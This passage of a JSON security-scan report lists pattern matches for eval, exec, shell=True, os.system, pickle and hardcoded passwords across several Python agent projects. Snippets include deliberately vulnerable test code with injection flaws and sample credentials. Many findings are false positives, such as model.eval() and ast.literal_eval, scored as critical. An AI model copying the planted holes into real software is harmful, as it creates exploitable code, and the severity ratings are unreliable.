      "file": "SECURITY_BACKUPS\\backup_1755822050\\OpenAI_Agent_Swarm\\agents\\tool_maker\\user_config.py",
      "line": 42,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    \"description\": tool_details['description'],\n                    \"parameters\": eval(tool_details['parameters']),\n                },"
    },
    {
      "file": "SECURITY_BACKUPS\\backup_1755822050\\TestMaster_BACKUP_20250816_175859\\specialized_test_generators.py",
      "line": 787,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        \n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        results.append((name, result.returncode == 0))"
    },
    {
      "file": "SECURITY_BACKUPS\\backup_1755822050\\TestMaster_BACKUP_20250816_175859\\week_5_8_batch_converter.py",
      "line": 29,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    print(\"Installing Google Gen AI SDK...\")\n    os.system(\"pip install google-generativeai\")\n    import google.generativeai as genai"
    },
    {
      "file": "SECURITY_BACKUPS_PHASE2\\backup_1755822512\\agency-swarm_agency_swarm_util_streaming_gradio_event_handler.py",
      "line": 130,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                try:\n                    args = eval(snapshot.function.arguments)\n                    recipient = args[\"recipient\"]"
    },
    {
      "file": "SECURITY_BACKUPS_PHASE2\\backup_1755822512\\agency-swarm_agency_swarm_util_streaming_term_event_handler.py",
      "line": 113,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                try:\n                    args = eval(snapshot.function.arguments)\n                    recipient = args[\"recipient\"]"
    },
    {
      "file": "SECURITY_BACKUPS_PHASE2\\backup_1755822512\\AWorld_examples_common_tools_browsers_async_browser.py",
      "line": 58,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            try:\n                subprocess.check_call('playwright install', shell=True, timeout=300)\n            except Exception as e:"
    },
    {
      "file": "SECURITY_BACKUPS_PHASE2\\backup_1755822512\\AWorld_examples_common_tools_browsers_browser.py",
      "line": 62,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            try:\n                subprocess.check_call('playwright install', shell=True, timeout=300)\n            except Exception as e:"
    },
    {
      "file": "SECURITY_BACKUPS_PHASE2\\backup_1755822512\\AWorld_examples_gaia_mcp_collections_documents_msxlsx.py",
      "line": 71,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            elif sys.platform == \"win32\":  # Windows\n                subprocess.run([\"start\", str(file_path)], shell=True, check=True)\n            else:  # Linux"
    },
    {
      "file": "SECURITY_BACKUPS_PHASE2\\backup_1755822512\\AWorld_examples_gaia_mcp_collections_tools_terminal.py",
      "line": 189,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                process = await asyncio.create_subprocess_shell(\n                    command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True\n                )"
    },
    {
      "file": "SECURITY_BACKUPS_PHASE2\\backup_1755822512\\AWorld_examples_gaia_mcp_collections_tools_terminal.py",
      "line": 196,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                    stderr=asyncio.subprocess.PIPE,\n                    shell=True,\n                    executable=\"/bin/bash\","
    },
    {
      "file": "SECURITY_BACKUPS_PHASE2\\backup_1755822512\\MetaGPT_tests_mock_mock_aiohttp.py",
      "line": 52,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if self.key in self.rsp_cache:\n            return eval(self.rsp_cache[self.key])\n        data = await self.response.content.read()"
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 91,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                command,\n                shell=False,  # NEVER use shell=True\n                cwd=cwd,"
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 246,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    # Original vulnerable code:\n    # result = subprocess.run(command, shell=True, capture_output=True, text=True)\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 251,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    \n    print(\"Fixed: specialized_test_generators.py - Replaced subprocess shell=True\")\n"
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 270,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    print(\"APPLYING COMMAND INJECTION SECURITY PATCHES\")\n    print(\"Fixing subprocess shell=True and os.system() vulnerabilities\")\n    print(\"=\" * 60)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 286,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    print(\"Command injection patches applied successfully!\")\n    print(\"All shell=True and os.system() usage replaced with safe alternatives\")\n    print(\"=\" * 60)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 169,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "class SafeSystemOperations:\n    \"\"\"Safe system operations to replace os.system() calls\"\"\"\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 257,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    # Original vulnerable code:\n    # os.system(\"pip install google-generativeai\")\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 262,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    \n    print(\"Fixed: week_5_8_batch_converter.py - Replaced os.system() with safe installer\")\n"
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 270,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    print(\"APPLYING COMMAND INJECTION SECURITY PATCHES\")\n    print(\"Fixing subprocess shell=True and os.system() vulnerabilities\")\n    print(\"=\" * 60)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_command_injection.py",
      "line": 286,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    print(\"Command injection patches applied successfully!\")\n    print(\"All shell=True and os.system() usage replaced with safe alternatives\")\n    print(\"=\" * 60)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 3,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\"\"\"\nSecurity Patch: Replace eval() and exec() usage with safe alternatives\nGenerated by Agent D - Critical Security Fix Implementation"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 16,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "class SafeCodeExecutor:\n    \"\"\"Safe alternatives to eval() and exec() for code execution\"\"\"\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 19,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    @staticmethod\n    def safe_eval(expression: str, allowed_names: Optional[Dict[str, Any]] = None) -> Any:\n        \"\"\""
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 35,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        Example:\n            >>> SafeCodeExecutor.safe_eval(\"{'key': 'value', 'number': 42}\")\n            {'key': 'value', 'number': 42}"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 40,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            return ast.literal_eval(expression)\n        except (ValueError, SyntaxError):"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 86,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \n        return eval(code, safe_globals, {})\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 177,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \"\"\"\n        Safely parse tool parameters without using eval().\n        "
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 197,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            result = ast.literal_eval(param_string)\n            if isinstance(result, dict):"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 317,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Original vulnerable code:\n    # \"parameters\": eval(tool_details['parameters']),\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 322,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    print(\"Fixed: tool_maker/user_config.py - Replaced eval() with safe parameter parser\")\n"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 354,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    print(\"APPLYING CRITICAL SECURITY PATCHES\")\n    print(\"Fixing eval() and exec() vulnerabilities\")\n    print(\"=\" * 60)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 371,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    print(\"Security patches applied successfully!\")\n    print(\"All eval() and exec() usage replaced with safe alternatives\")\n    print(\"=\" * 60)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 381,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    executor = SafeCodeExecutor()\n    result = executor.safe_eval(\"{'key': 'value', 'number': 42}\")\n    print(f\"Safe eval result: {result}\")"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 3,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\"\"\"\nSecurity Patch: Replace eval() and exec() usage with safe alternatives\nGenerated by Agent D - Critical Security Fix Implementation"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 16,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "class SafeCodeExecutor:\n    \"\"\"Safe alternatives to eval() and exec() for code execution\"\"\"\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 100,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    @staticmethod\n    def safe_exec(code: str, namespace: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:\n        \"\"\""
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 115,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        Example:\n            >>> result = SafeCodeExecutor.safe_exec(\"result = 2 + 2\")\n            >>> result['result']"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 167,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \n        exec(code, safe_globals, namespace)\n        return namespace"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 328,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Original vulnerable code:\n    # exec(f.read(), globals())\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 332,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # code_content = f.read()\n    # namespace = SafeCodeExecutor.safe_exec(code_content)\n    # globals().update(namespace)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 335,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    print(\"Fixed: tool_maker/tool_user.py - Replaced exec() with safe executor\")\n"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 341,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Original vulnerable code:\n    # exec(result, exec_globals)\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 344,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Safe replacement:\n    # SafeCodeExecutor.safe_exec(result, exec_globals)\n    "
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 346,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    print(\"Fixed: ToolFactory.py - Replaced exec() with safe executor\")\n"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 354,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    print(\"APPLYING CRITICAL SECURITY PATCHES\")\n    print(\"Fixing eval() and exec() vulnerabilities\")\n    print(\"=\" * 60)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 371,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    print(\"Security patches applied successfully!\")\n    print(\"All eval() and exec() usage replaced with safe alternatives\")\n    print(\"=\" * 60)"
    },
    {
      "file": "SECURITY_PATCHES\\fix_eval_exec_vulnerabilities.py",
      "line": 385,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Test safe exec\n    namespace = executor.safe_exec(\"result = 2 + 2\\nvalues = [1, 2, 3]\")\n    print(f\"Safe exec result: {namespace.get('result')}\")"
    },
    {
      "file": "swarm\\examples\\customer_service_streaming\\src\\evals\\eval_function.py",
      "line": 30,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    try:\n        ground_truth = ast.literal_eval(self.groundtruth)\n    except:"
    },
    {
      "file": "swarm\\examples\\customer_service_streaming\\src\\evals\\eval_function.py",
      "line": 58,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    try:\n       names = ast.literal_eval(name_extract)\n       ground_truth = self.groundtruth"
    },
    {
      "file": "swarms\\examples\\simulations\\map_generation\\game_map.py",
      "line": 154,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            self.midas_model.to(self.device)\n            self.midas_model.eval()\n"
    },
    {
      "file": "swarms\\swarms\\agents\\consistency_agent.py",
      "line": 190,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                                                            Defaults to None.\n            eval (bool, optional): Enable evaluation mode for answer validation.\n                                 Defaults to False."
    },
    {
      "file": "swarms\\swarms\\agents\\reasoning_agents.py",
      "line": 100,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        memory_capacity (int): Memory capacity for agents that support it.\n        eval (bool): Enable evaluation mode for self-consistency.\n        random_models_on (bool): Enable random model selection for diversity."
    },
    {
      "file": "swarms\\swarms\\structs\\multi_model_gpu_manager.py",
      "line": 1310,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Ensure model is in eval mode\n            self.model.eval()\n"
    },
    {
      "file": "swarms\\swarms\\structs\\multi_model_gpu_manager.py",
      "line": 1337,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Similar to forward but with different post-processing\n            self.model.eval()\n"
    },
    {
      "file": "swarms\\swarms\\utils\\agent_cache.py",
      "line": 2,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport hashlib"
    },
    {
      "file": "swarms\\tests\\structs\\test_conversation.py",
      "line": 105,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def test_message_retrieval():\n        \"\"\"Test message retrieval methods\"\"\""
    },
    {
      "file": "swarms\\tests\\utils\\test_math_eval.py",
      "line": 21,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "def test_same_results_no_exception(caplog):\n    @math_eval(func1_no_exception, func2_no_exception)\n    def test_func(x):"
    },
    {
      "file": "swarms\\tests\\utils\\test_math_eval.py",
      "line": 31,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "def test_func1_exception(caplog):\n    @math_eval(func1_with_exception, func2_no_exception)\n    def test_func(x):"
    },
    {
      "file": "TestMaster\\enhanced_incremental_ast_engine.py",
      "line": 13,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\enhanced_realtime_security_monitor.py",
      "line": 356,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                            \"Never execute user-provided code dynamically\",\n                            \"Use safe alternatives like ast.literal_eval()\",\n                            \"Implement strict input validation\""
    },
    {
      "file": "TestMaster\\enhanced_realtime_security_monitor.py",
      "line": 1031,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Code injection vulnerability\n    eval(user_input)\n    "
    },
    {
      "file": "TestMaster\\enhanced_realtime_security_monitor.py",
      "line": 1028,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    command = \"ls \" + user_input\n    os.system(command)\n    "
    },
    {
      "file": "TestMaster\\enhanced_realtime_security_monitor.py",
      "line": 1020,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import subprocess\nimport pickle\n"
    },
    {
      "file": "TestMaster\\enhanced_realtime_security_monitor.py",
      "line": 1024,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    # Multiple security issues\n    password = \"hardcoded_secret_123\"  # Hardcoded credential\n    "
    },
    {
      "file": "TestMaster\\enhanced_security_intelligence_agent.py",
      "line": 980,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                        code = f\"print('{user_input}')\"\n                        eval(code)\n                        "
    },
    {
      "file": "TestMaster\\enhanced_security_intelligence_agent.py",
      "line": 966,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "                    command = f\"cat {config_path} | grep {user_input}\"\n                    result = os.system(command)\n                    "
    },
    {
      "file": "TestMaster\\enhanced_security_intelligence_agent.py",
      "line": 951,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import subprocess\nimport pickle\nimport random"
    },
    {
      "file": "TestMaster\\live_code_quality_monitor.py",
      "line": 984,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        password = \"hardcoded_secret_123\"  # Security issue\n        eval(\"1 + 1\")  # Dangerous function\n        "
    },
    {
      "file": "TestMaster\\live_code_quality_monitor.py",
      "line": 983,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    def method_without_docs(self):  # No docstring\n        password = \"hardcoded_secret_123\"  # Security issue\n        eval(\"1 + 1\")  # Dangerous function"
    },
    {
      "file": "TestMaster\\real_time_monitor.py",
      "line": 393,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        # Clear screen (works on most terminals)\n        os.system('cls' if os.name == 'nt' else 'clear')\n        "
    },
    {
      "file": "TestMaster\\restore_archive_robust.py",
      "line": 280,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Execute the test\n            exec(code, namespace)\n            "
    },
    {
      "file": "TestMaster\\restore_archive_robust.py",
      "line": 520,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Execute the code\n            exec(code, namespace)\n            "
    },
    {
      "file": "TestMaster\\restore_archive_robust.py",
      "line": 562,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            for setup_code in self.setup:\n                exec(setup_code)\n            "
    },
    {
      "file": "TestMaster\\restore_archive_robust.py",
      "line": 572,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                try:\n                    exec(teardown_code)\n                except Exception as e:"
    },
    {
      "file": "TestMaster\\risk_based_test_targeter.py",
      "line": 393,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "            # Hardcoded secrets risk\n            secret_patterns = ['password=', 'api_key=', 'secret=', 'token=']\n            for pattern in secret_patterns:"
    },
    {
      "file": "TestMaster\\specialized_test_generators.py",
      "line": 787,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        \n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        results.append((name, result.returncode == 0))"
    },
    {
      "file": "TestMaster\\testmaster_orchestrator.py",
      "line": 28,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\n"
    },
    {
      "file": "TestMaster\\test_security_full_integration.py",
      "line": 46,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        def process_user_input(user_data):\n            eval(user_data)  # Security vulnerability\n            return user_data"
    },
    {
      "file": "TestMaster\\test_security_full_integration.py",
      "line": 280,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        test_code = {\n            'content': 'eval(user_input); os.system(cmd); pickle.loads(data)',\n            'file_path': 'test_threats.py'"
    },
    {
      "file": "TestMaster\\test_security_full_integration.py",
      "line": 280,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        test_code = {\n            'content': 'eval(user_input); os.system(cmd); pickle.loads(data)',\n            'file_path': 'test_threats.py'"
    },
    {
      "file": "TestMaster\\test_security_integration_validation.py",
      "line": 97,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        test_code = {\n            'content': 'eval(user_input); os.system(command); pickle.loads(data)',\n            'file_path': 'test_file.py'"
    },
    {
      "file": "TestMaster\\test_security_integration_validation.py",
      "line": 97,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        test_code = {\n            'content': 'eval(user_input); os.system(command); pickle.loads(data)',\n            'file_path': 'test_file.py'"
    },
    {
      "file": "TestMaster\\unified_orchestration_example.py",
      "line": 274,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    # Command injection vulnerability\n    result = os.system(f\"cat {filename}\")\n    return result"
    },
    {
      "file": "TestMaster\\unified_security_scanner.py",
      "line": 1047,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Code injection\n    eval(user_input)\n    "
    },
    {
      "file": "TestMaster\\unified_security_scanner.py",
      "line": 1038,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    # Command injection\n    os.system(f\"echo {user_input}\")\n    "
    },
    {
      "file": "TestMaster\\unified_security_scanner.py",
      "line": 1030,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import subprocess\nimport pickle\n"
    },
    {
      "file": "TestMaster\\unified_security_scanner.py",
      "line": 1035,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    # Hardcoded credential\n    password = \"admin123\"\n    "
    },
    {
      "file": "TestMaster\\validate_phase_1_7.py",
      "line": 168,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    if sys.platform.startswith('win'):\n        os.system('chcp 65001 > nul')\n    "
    },
    {
      "file": "TestMaster\\week_5_8_batch_converter.py",
      "line": 29,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    print(\"Installing Google Gen AI SDK...\")\n    os.system(\"pip install google-generativeai\")\n    import google.generativeai as genai"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\anomaly_detection\\anomaly_detection_analyzer.py",
      "line": 557,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if re.search(r'\\beval\\s*\\(', content):\n            anomalies.append(\"Use of eval() function detected\")\n        "
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\anomaly_detection\\anomaly_detection_analyzer.py",
      "line": 700,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if any(\"eval\" in anomaly for anomaly in rule_anomalies):\n            recommendations.append(\"Replace eval() with safer alternatives like ast.literal_eval()\")\n        "
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\anomaly_detection\\anomaly_detection_analyzer.py",
      "line": 700,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if any(\"eval\" in anomaly for anomaly in rule_anomalies):\n            recommendations.append(\"Replace eval() with safer alternatives like ast.literal_eval()\")\n        "
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\anomaly_detection\\anomaly_detection_analyzer.py",
      "line": 560,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if re.search(r'\\bexec\\s*\\(', content):\n            anomalies.append(\"Use of exec() function detected\")\n        "
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\anomaly_detection\\anomaly_detection_analyzer.py",
      "line": 703,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if any(\"exec\" in anomaly for anomaly in rule_anomalies):\n            recommendations.append(\"Avoid exec() or implement strict sandboxing\")\n        "
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\anomaly_detection\\anomaly_detection_analyzer.py",
      "line": 13,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import math\nimport pickle\nimport hashlib"
    },
    {
      "file": "TestMaster\\analysis\\comprehensive_analysis\\ml_analysis\\ml_model_analyzer.py",
      "line": 78,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
